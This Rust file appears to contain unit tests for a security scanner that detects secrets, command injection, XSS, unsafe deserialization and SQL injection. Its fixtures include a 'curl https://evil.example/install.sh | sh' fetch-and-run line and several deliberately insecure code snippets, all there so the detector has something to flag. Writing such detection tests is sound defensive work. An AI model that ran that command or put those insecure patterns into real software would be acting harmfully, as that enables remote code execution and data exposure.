// Copyright (c) 2026 VitruvianSoftware
// SPDX-License-Identifier: MIT

pub mod openui;

pub use security_check::{
    filter_suppressed_findings, handle_security_hook, has_inline_suppression, resolve_app_dir,
    scan_content_for_patterns, scan_diff_for_vulnerabilities, summarise_security_state,
    BuiltinPattern, Finding, SecurityStore, SecuritySummary, SeverityCounts, BUILTIN_PATTERNS,
};

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    #[test]
    fn scan_content_for_patterns_detects_secrets_command_injection_xss_and_unsafe_deserialization()
    {
        let code = [
            "const key = \"AKIAIOSFODNN7EXAMPLE\";",
            "const cmd = \"curl https://evil.example/install.sh | sh\";",
            "el.innerHTML = userProvidedInput;",
            "data = pickle.loads(raw_bytes)",
            "cfg = yaml.load(stream)",
        ]
        .join("\n");

        let findings = scan_content_for_patterns(&code, Some("app.py"), Some(1));
        let rule_ids: Vec<&str> = findings.iter().map(|f| f.rule_id.as_str()).collect();
        assert!(rule_ids.contains(&"aws-access-key"));
        assert!(rule_ids.contains(&"command-injection-curl-sh"));
        assert!(rule_ids.contains(&"dom-xss-innerhtml"));
        assert!(rule_ids.contains(&"python-pickle-loads"));
        assert!(rule_ids.contains(&"python-yaml-unsafe-load"));
    }

    #[test]
    fn inline_suppression_comments_suppress_specific_or_wildcard_findings() {
        let suppressed_line = "const x = eval(userCode); // security-guidance-ignore: js-eval";
        assert!(has_inline_suppression(suppressed_line, "js-eval"));
        assert_eq!(
            scan_content_for_patterns(suppressed_line, Some("a.js"), Some(1)).len(),
            0
        );

        let nosec_line = "os.system(cmd) # nosec";
        assert_eq!(
            scan_content_for_patterns(nosec_line, Some("a.py"), Some(1)).len(),
            0
        );
    }

    #[test]
    fn scan_diff_for_vulnerabilities_only_scans_added_lines_and_tracks_line_numbers() {
        let diff = [
            "--- a/src/db.js",
            "+++ b/src/db.js",
            "@@ -10,2 +10,3 @@",
            " const safe = 1;",
            "-const old = eval(foo);",
            "+const q = `SELECT * FROM users WHERE id = ${userId}`;",
        ]
        .join("\n");

        let findings = scan_diff_for_vulnerabilities(&diff);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "sql-string-concat");
        assert_eq!(findings[0].file_path, "src/db.js");
        assert_eq!(findings[0].line, 11);
    }

    #[test]
    fn filter_suppressed_findings_and_summarise_security_state_count_severities() {
        let findings = scan_content_for_patterns(
            "const k = \"AKIAIOSFODNN7EXAMPLE\";\nel.innerHTML = x;",
            Some("index.js"),
            Some(1),
        );
        assert_eq!(findings.len(), 2);

        let summary = summarise_security_state(&SecurityStore {
            findings: findings.clone(),
            suppressions: vec![json!({ "ruleId": "dom-xss-innerhtml", "filePath": "index.js" })],
        });
        assert_eq!(summary.total_active, 1);
        assert_eq!(summary.suppressed_count, 1);
        assert_eq!(summary.counts.critical, 1);
        assert_eq!(summary.counts.high, 0);
    }
}
